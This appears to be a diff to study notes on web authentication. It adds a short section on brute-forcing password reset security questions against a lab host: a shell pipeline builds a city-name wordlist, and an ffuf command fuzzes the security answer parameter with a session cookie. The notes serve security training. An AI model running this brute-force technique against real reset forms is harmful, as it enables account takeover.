@@ -99,3 +99,16 @@ However, this causes an issue as an attacker can set arbitrary HTTP headers in r
 ## CAPTCHAs
 
 A `Completely Automated Public Turing test to tell Computers and Humans Apart (CAPTCHA)` is a security measure to prevent bots from submitting requests. By forcing humans to make requests instead of bots or scripts, brute-force attacks become a manual task, making them infeasible in most cases. CAPTCHAs typically present challenges that are easy for humans to solve but difficult for bots, such as identifying distorted text, selecting particular objects from images, or solving simple puzzles. By requiring users to complete these challenges before accessing certain features or submitting forms, CAPTCHAs help prevent automated scripts from performing actions that could be harmful, such as spamming forums, creating fake accounts, or launching brute-force attacks on login pages. While CAPTCHAs serve an essential purpose in deterring automated abuse, they can also present usability challenges for some users, particularly those with visual impairments or specific cognitive disabilities.
+
+
+## Guessable Password Reset Questions
+```shell-session
+cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
+wc -l city_wordlist.txt 
+```
+
+```shell-session
+ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
+```
+- This command is used to Fuzz the parameter "security_response" and eliminating responses "Incorrect response"
+
